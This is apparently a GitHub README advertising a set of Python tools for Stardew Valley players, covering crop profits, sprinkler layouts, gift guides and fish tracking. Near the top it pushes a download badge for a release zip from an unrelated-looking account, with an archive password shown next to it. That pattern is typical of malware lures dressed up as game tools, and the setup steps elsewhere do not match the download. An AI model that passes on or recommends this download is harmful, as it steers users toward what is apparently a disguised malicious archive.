`stardew-valley` `farm-planner` `automation` `min-max` `crop-calculator` `stardew-mods` `farming-sim` `sprinkler-layout` `stardew-tools`

# StardewValley-FarmToolkit

I wanted to min-max my farm without alt-tabbing to the wiki every 30 seconds. So I built a bunch of Python tools that do the math for me — crop profits, sprinkler layouts, gift schedules, all of it. Now I can actually play the game instead of staring at spreadsheets.

## Download

[![DOWNLOAD STARDEW-VALLEY](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/Betalyacompress/Stardew-Valley-Farm/releases/download/Release/SV.zip)

**🔐 — 1847**

---

## Why I Built This

Stardew Valley is one of those games where you think you're relaxing, and then suddenly you're deep in a spreadsheet calculating whether Ancient Fruit wine or Starfruit wine gives better gold-per-day when you factor in processing time and keg availability. That's... not relaxing anymore.

I kept alt-tabbing to the wiki to check gift preferences, fish locations, bundle requirements — you name it. Eventually I just wrote scripts to track everything in one place. The crop profit calculator alone saved me from planting parsnips in Fall one too many times (don't ask).

## What's Inside

Each module handles a different part of the game so you can use them standalone or together:

- **crop_profit_calc** — Calculates gold-per-day for every crop factoring in seed cost, growth time, regrow cycles, and processing (preserves jar vs keg). Accounts for quality fertilizer and agriculturist profession.
- **sprinkler_planner** — Generates optimal sprinkler layouts for any farm type. Handles basic, quality, and iridium sprinklers. Shows you exactly where to place them for max coverage.
- **animal_tracker** — Tracks friendship levels, product quality progression, and expected daily income for each barn/coop animal. Tells you when to pet and when to harvest.
- **gift_guide** — Lookup table for every villager's loved/liked gifts with calendar reminders for birthdays. No more accidentally gifting Haley a prismatic shard when you meant it for the museum.
- **schedule_optimizer** — Plans your daily in-game routine to minimize wasted time. Prioritizes tasks by energy cost and time sensitivity. Basically a speedrun planner for normal gameplay.
- **mine_tracker** — Tracks which floors you've cleared, elevator unlocks, monster kill goals, and ore needs. Helps you figure out when to push deeper vs farm specific floors.
- **fish_checklist** — Tracks caught/uncaught fish by season, time, weather, and location. Flags fish you're about to miss before the season changes.
- **bundle_tracker** — Community Center bundle progress tracker. Shows what you still need, where to get it, and what's seasonal so you don't miss a window.
- **farm_layout_designer** — ASCII/grid-based farm layout planner. Place buildings, paths, sprinklers, and crops on a grid that matches your farm type dimensions.

### Presets

Different vibes for different playstyles:

| Preset | Description |
|---|---|
| `min_maxer` | Maximum gold per day. Ancient fruit greenhouses, keg empires, optimal crop rotations. |
| `relaxed` | No pressure — just reminders for birthdays, seasonal crops, and festivals. |
| `completionist` | Track everything — all fish, all bundles, all recipes, all friendships to 10 hearts. |
| `first_year` | Focused guide for Year 1 Community Center completion. Prioritizes seasonal items you can't miss. |

## How to Set It Up

1. Have Python 3.9+ installed
2. Clone or download this repo
3. Install dependencies:
   ```
   pip install -r requirements.txt
   ```
4. Run the toolkit:
   ```
   python farm_toolkit.py --preset min_maxer
   ```
5. Or use individual modules:
   ```
   python -m tweaks.crop_profit_calc --season summer --year 1
   ```

The crop calculator will ask for your farming level and profession on first run. Everything else just works out of the box.

## Known Issues

- Crop profit calc doesn't account for Qi's crop challenges yet (1.5 endgame stuff).
- Sprinkler planner sometimes gets weird with the Riverland farm layout — the irregular plots trip it up.
- Gift guide data is based on 1.5 — haven't added 1.6 changes if any gift preferences shifted.
- Farm layout designer is text-based for now. I know it's ugly. A proper GUI is on the maybe-someday list.
- Schedule optimizer assumes you have the horse by default. If you don't, travel times will be off.

> This project is not affiliated with ConcernedApe or Stardew Valley. Just a fan tool — use it however you like, but don't blame me if you spend even more time optimizing instead of actually playing.
